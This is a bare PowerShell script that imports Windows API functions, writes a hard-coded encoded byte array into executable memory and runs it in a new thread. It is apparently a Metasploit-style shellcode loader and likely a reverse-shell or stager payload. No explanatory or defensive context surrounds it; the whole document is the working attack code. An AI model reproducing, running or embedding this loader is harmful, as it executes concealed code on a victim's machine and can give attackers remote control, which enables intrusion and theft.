$CgD = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $CgD -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0xf5,0xfd,0x9c,0xa5,0xd9,0xc6,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,0x47,0x31,0x58,0x13,0x03,0x58,0x13,0x83,0xc0,0xf1,0x1f,0x69,0x59,0x11,0x5d,0x92,0xa2,0xe1,0x02,0x1a,0x47,0xd0,0x02,0x78,0x03,0x42,0xb3,0x0a,0x41,0x6e,0x38,0x5e,0x72,0xe5,0x4c,0x77,0x75,0x4e,0xfa,0xa1,0xb8,0x4f,0x57,0x91,0xdb,0xd3,0xaa,0xc6,0x3b,0xea,0x64,0x1b,0x3d,0x2b,0x98,0xd6,0x6f,0xe4,0xd6,0x45,0x80,0x81,0xa3,0x55,0x2b,0xd9,0x22,0xde,0xc8,0xa9,0x45,0xcf,0x5e,0xa2,0x1f,0xcf,0x61,0x67,0x14,0x46,0x7a,0x64,0x11,0x10,0xf1,0x5e,0xed,0xa3,0xd3,0xaf,0x0e,0x0f,0x1a,0x00,0xfd,0x51,0x5a,0xa6,0x1e,0x24,0x92,0xd5,0xa3,0x3f,0x61,0xa4,0x7f,0xb5,0x72,0x0e,0x0b,0x6d,0x5f,0xaf,0xd8,0xe8,0x14,0xa3,0x95,0x7f,0x72,0xa7,0x28,0x53,0x08,0xd3,0xa1,0x52,0xdf,0x52,0xf1,0x70,0xfb,0x3f,0xa1,0x19,0x5a,0xe5,0x04,0x25,0xbc,0x46,0xf8,0x83,0xb6,0x6a,0xed,0xb9,0x94,0xe2,0xc2,0xf3,0x26,0xf2,0x4c,0x83,0x55,0xc0,0xd3,0x3f,0xf2,0x68,0x9b,0x99,0x05,0x8f,0xb6,0x5e,0x99,0x6e,0x39,0x9f,0xb3,0xb4,0x6d,0xcf,0xab,0x1d,0x0e,0x84,0x2b,0xa2,0xdb,0x31,0x29,0x34,0x24,0x6d,0x30,0xd6,0xcc,0x6c,0x33,0xc7,0x50,0xf8,0xd5,0xb7,0x38,0xaa,0x49,0x77,0xe9,0x0a,0x3a,0x1f,0xe3,0x84,0x65,0x3f,0x0c,0x4f,0x0e,0xd5,0xe3,0x26,0x66,0x41,0x9d,0x62,0xfc,0xf0,0x62,0xb9,0x78,0x32,0xe8,0x4e,0x7c,0xfc,0x19,0x3a,0x6e,0x68,0xea,0x71,0xcc,0x3e,0xf5,0xaf,0x7b,0xbe,0x63,0x54,0x2a,0xe9,0x1b,0x56,0x0b,0xdd,0x83,0xa9,0x7e,0x56,0x0d,0x3c,0xc1,0x00,0x72,0xd0,0xc1,0xd0,0x24,0xba,0xc1,0xb8,0x90,0x9e,0x91,0xdd,0xde,0x0a,0x86,0x4e,0x4b,0xb5,0xff,0x23,0xdc,0xdd,0xfd,0x1a,0x2a,0x42,0xfd,0x49,0xaa,0xbe,0x28,0xb7,0xd8,0xae,0xe8;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$h1Mn=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($h1Mn.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$h1Mn,0,0,0);for (;;){Start-sleep 60};